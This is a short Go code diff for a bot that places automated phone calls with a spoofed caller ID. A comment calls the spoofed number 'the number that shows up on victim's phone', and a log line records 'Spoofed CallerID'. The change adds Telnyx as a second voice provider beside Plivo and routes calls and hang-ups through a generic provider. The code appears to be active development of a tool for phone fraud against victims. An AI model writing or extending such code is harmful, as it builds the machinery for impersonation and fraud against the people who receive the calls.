@@ -75,7 +75,13 @@ func (b *Bot) processCall(job CallJob) {
 	// Use CallerID for spoofing - this is the number that shows up on victim's phone!
 	callerID := cfg.CallerID
 	if callerID == "" {
-		callerID = cfg.PlivoNumber // fallback to Plivo number
+		// Fallback to provider-specific number
+		switch cfg.VoiceProvider {
+		case "telnyx":
+			callerID = cfg.TelnyxNumber
+		default:
+			callerID = cfg.PlivoNumber
+		}
 	}
 
 	callReq := voice.CallRequest{
@@ -97,7 +103,7 @@ func (b *Bot) processCall(job CallJob) {
 	}
 	b.db.CreateLog("INFO", fmt.Sprintf("Initiating call: %s -> %s (Spoofed CallerID: %s)", callerInfo, job.Phone, callerInfo), "")
 
-	resp, err := b.plivo.MakeCall(callReq)
+	resp, err := b.provider.MakeCall(callReq)
 	if err != nil {
 		log.Printf("Failed to make call to %s: %v", job.Phone, err)
 		b.db.UpdateCallStatus(job.CallID, "failed", "")
@@ -341,7 +347,7 @@ func (b *Bot) HangupCall(uuid string) {
 	delete(b.activeCalls, uuid)
 	b.mu.Unlock()
 
-	b.plivo.HangupCall(uuid)
+	b.provider.HangupCall(uuid)
 }
 
 func (b *Bot) GetActiveCalls() int {
